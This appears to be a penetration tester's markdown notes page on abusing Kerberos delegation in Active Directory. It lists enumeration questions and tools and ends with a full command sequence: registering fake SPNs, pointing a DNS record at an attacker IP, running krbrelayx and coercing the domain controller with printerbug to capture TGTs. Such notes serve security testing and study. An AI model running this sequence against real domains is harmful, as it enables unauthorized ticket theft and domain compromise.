# [Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations)

## Questions to ask yourself
  *  Any user/computer objects with unreadable [delegation attributes](https://github.com/SpacemanHenry/hacknotes/blob/main/Information%20Gathering/Service%20Enumeration/LDAP.md#delegation-permissions)?
  *  Any objects with delegation privileges [kerberoastable](https://github.com/SpacemanHenry/hacknotes/blob/main/Exploitation/Authentication/Kerberos/Kerberoast.md)?
  *  What services have service principal names configured?
      *  What users have high privileges over those services?

## Things to remember
  *  Unconstrained delegation requires non-default configuration for user objects

## Useful tools
  *  [`krbrelayx`](https://github.com/dirkjanm/krbrelayx) toolkit for abusing unconstrained delegation
  *  [`impacket-getST`](https://github.com/fortra/impacket/blob/master/examples/getST.py) for impersonating users via constrained delegation

## [Unconstrained delegation](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
  *  KDC provides KUD service accounts a TGT of any user that auths via SPN
      *  Any method of coerced authentication can often be used... get creative!
      *  Add FQDN of domain controller to `hosts` file to avoid DNS errors
  *  `krbrelayx` for abusing user accounts with KUD (relies on [`Write servicePrincipalName`](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver16))
      *  Create SPN for service account using fake hostname
      *  Create DNS entry matching fake hostname pointing to attacker IP
      *  Coerce authentication to the fake hostname SPNs and capture TGT
  *  Computer accounts with KUD are [easily abused by extracting delegated TGTs from memory](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
      *  Coerce authentication to default SPNs such as HOST/CIFS

// Unconstrained delegation abuse via service (user) account 
```
git clone https://github.com/dirkjanm/krbrelayx && cd krbrelayx
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s host/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 addspn.py -u corp.local\\sqlsvc -p 'password' -s cifs/FAKE.CORP.LOCAL ldap://DC.CORP.LOCAL
python3 dnstool.py -u corp.local\\sqlsvc -p 'password' -r FAKE.CORP.LOCAL -a add -d [ATTACKER IP] DC.CORP.LOCAL
python3 krbrelayx.py --krbsalt CORP.LOCALsqlsvc --krbpass 'password'
python3 printerbug.py corp.local/sqlsvc:'password'@DC.CORP.LOCAL FAKE.CORP.LOCAL
```
